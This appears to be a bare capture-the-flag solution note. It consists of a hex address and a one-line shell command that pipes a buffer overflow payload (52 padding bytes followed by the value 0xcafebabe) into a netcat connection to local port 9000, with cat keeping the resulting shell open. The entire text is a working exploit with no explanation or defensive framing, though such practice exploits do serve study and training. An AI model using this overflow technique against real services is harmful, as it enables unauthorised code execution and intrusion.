0x5655623c
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca")';cat) | nc 0 9000